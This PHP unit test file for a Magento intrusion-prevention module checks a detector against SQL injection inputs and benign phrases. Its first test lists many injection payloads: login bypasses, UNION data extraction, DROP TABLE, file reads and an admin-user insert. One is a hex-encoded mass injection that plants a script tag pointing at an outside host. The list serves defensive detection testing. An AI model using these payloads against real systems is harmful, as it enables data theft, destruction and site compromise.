<?php
namespace MSP\Shield\Test\Unit\Model;

use MSP\Shield\Api\DetectorInterface;
use MSP\Shield\Api\ScanResultInterface;

class IpsTest extends \Magento\TestFramework\TestCase\AbstractController
{
    public function testMySQLInjectionAttackPatterns()
    {
        $detector = \Magento\TestFramework\Helper\Bootstrap::getObjectManager()
            ->create('MSP\Shield\Model\Ips');

        $fieldName = 'somefield';
        $tests = [ // A set of attack patterns found in fuzzdb, OWASP db and surfing the web
            "' or 1=1 --",
            "' or 1 or '",
            "' or 1 or 1 or 1 or 1 or '",
            " or 1 or 1 or 1 or 1",
            "1 and 1=1",
            "1' and 1=(select count(*) from admin_user); --",
            "1 or 1=1",
            "1' or '1'='1",
            "1'or'1'='1",
            "fake@ema'or'il.nl'='il.nl",
            "'; desc admin_user; --",
            "1' and 1 = '1",
            "' or username is not NULL or username = '",
            "1 and ascii(lower(substring((select top 1 name from admin_user where xtype='u'), 1, 1))) > 116",
            "1 union all select 1,2,3,4,5,6,name from admin_user where xtype = 'u' --",
            "1 uni/**/on select all from admin_user where",
            "username' OR 1=1 --",
            "'OR '' = '	Allows authentication without a valid username.",
            "username' --",
            "' union select 1, 'somefield', 'someother' 1 --",
            "'OR 1=1--",
            "create table myfile (input TEXT);",
            "load data infile 'filepath' into table admin_user; select * from admin_user;",
            "' or 1 --",
            "' or 1 -- adasd ",
            "' or 1=1 --",
            "or 1=1 --",
            "' OR ''='",
            "' or 'a'='a",
            '" or "a"="a',
            "') or ('a'='a",
            "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='",
            "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '__w%') AND ''='",
            "'OR''='",
            "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='",
            "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='",
            "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%j%')>1 AND ''='",
            "' OR (SELECT COUNT(*) FROM users)>10 AND ''='",
            "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%r%') AND ''='",
            "' OR EXISTS(SELECT * FROM users WHERE name!='jake' AND name LIKE '%a%') AND ''='",
            "' or '1'='1' -- '",
            "' or '1'='1' ({ '",
            "' or '1'='1' /* '",

            "1;DROP TABLE `admin_user`",
            "10;DROP table admin_user --",
            "x' AND email IS NULL; --",
            "x' AND 1=(SELECT COUNT(*) FROM admin_user); --",
            "x' AND members.email IS NULL; --",
            "x'; INSERT INTO admin_user ('email','passwd','login_id','full_name')VALUES ('steve@unixwiz.net','hello','steve','Steve Friedl');--",
            "x'; UPDATE admin_user SET email = 'me@somewhere.com' WHERE email = 'bob@example.com",
            "23 OR 1=1",
            "'; DROP TABLE admin_user; --",
            "111 /*This is my comment...*/UN/*Can You*/IO/*Find It*/N/**/ S/**/E/**/LE/*Another comment to*/CT/*Find. Can you dig*//*it*/*",
            "71985 OR 1 = 1",
            "71985 OR 1 =1",
            "71985 OR 1=1",
            "71985 OR 1= 1",
            "71985 OR '1'= 1",
            "71985 OR 1= '1'",
            "71985 OR user_id=123",
            "71985 OR user_id =123",
            "71985 OR 'asd' = user_id",
            "71985 OR user_id = user_id",
            "71985 OR 'a' = 'a'; --",
            "71985 OR 'a' = 'a';",

            '1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- ',
            '; SELECT(xxxx) ',
            ";DECLARE @S CHAR(4000);SET @S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777322E73383030716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72 AS CHAR(4000));EXEC(@S);",
            '; SELECT LOAD_FILE(0x633A5C626F6F742E696E69)',
            'SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))',
            'SELECT CHAR(75)+CHAR(76)+CHAR(77)',
            'SELECT login || \'-\' || password FROM members',
            'DROP/*comment*/sampletable',
            ';DR/**/OP/*bypass blacklisting*/sampletable',
            ';DR/**/OP/*bypass blacklisting*/ sampletable',

            '1;SELECT/*avoid-spaces*/password/**/FROM/**/Members ',
            'SELECT /*!32302 1/0, */ 1 FROM admin_user',
            "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--",
            "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
            "-1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL-- ",
            "11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- ",
            "11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –- ",
            ",0 UNION ALL SELECT 1,'x'/*,10 ;",
            "';shutdown --",
            "(SELECT id FROM admin_user WHERE name = 'tablenameforcolumnnames')",
            "BENCHMARK(howmanytimes, do this)",
            "BENCHMARK (howmanytimes, do this)",
            "1 union select benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1",
            "my@email.com' ORDER BY 19-- mmbG"
        ];

        $timeStart = microtime(true);
        foreach ($tests as $test) {
            /** @var ScanResultInterface $scanResult */
            $scanResult = $detector->scanRequest(['POST' => [$fieldName => $test]]);
            $this->assertGreaterThanOrEqual(DetectorInterface::SCORE_CRITICAL_MATCH, $scanResult->getScore(), "Failed to detect attack: " . $test);
        }
        $timeEnd = microtime(true);

        $averageTime = ($timeEnd - $timeStart) / count($tests);
        echo $averageTime."\n";
    }

    public function testUncertainContents()
    {
        $detector = \Magento\TestFramework\Helper\Bootstrap::getObjectManager()
            ->create('MSP\Shield\Model\Ips');

        $fieldName = 'somefield';
        $tests = [
            "3 or something",
            "4 or more",
        ];

        $timeStart = microtime(true);
        foreach ($tests as $test) {
            /** @var ScanResultInterface $scanResult */
            $scanResult = $detector->scanRequest(['POST' => [$fieldName => $test]]);
            $this->assertLessThan(50, $scanResult->getScore(),
                "False positive on: <" . $test . '>');

            $this->assertGreaterThan(10, $scanResult->getScore(),
                "Possible threat not detected: <" . $test . '>');
        }
        $timeEnd = microtime(true);

        $averageTime = ($timeEnd - $timeStart) / count($tests);
        echo $averageTime."\n";
    }

    public function testNonDangerousContents()
    {
        $detector = \Magento\TestFramework\Helper\Bootstrap::getObjectManager()
            ->create('MSP\Shield\Model\Ips');

        $fieldName = 'somefield';
        $tests = [
            'I would like to test; Any way?',
            "I'dd like to test this phrase or another one",
            'A composed-word should not trigger',
            'I would like to test; Any way?',
            "I'dd like to test this phrase or another one I'll find",
            '123',
            'A composed-word should not trigger',
            'This is a normal phrase(should not trigger); But I need to check it and test!',
            'someone could -- write this',
            'The way you select your words may or may not activate a trigger',
            'You should select your words from you vocabulary',
            'Let me try writing a complex phrase talking about a table you should select and like to make a quote',
            '{1, 2, 3, 4, 5, 6, 7}',
        ];

        $timeStart = microtime(true);
        foreach ($tests as $test) {
            /** @var ScanResultInterface $scanResult */
            $scanResult = $detector->scanRequest(['POST' => [$fieldName => $test]]);
            $this->assertLessThan(20, $scanResult->getScore(),
                "False positive on: <" . $test . '>');
        }
        $timeEnd = microtime(true);

        $averageTime = ($timeEnd - $timeStart) / count($tests);
        echo $averageTime."\n";
    }
}
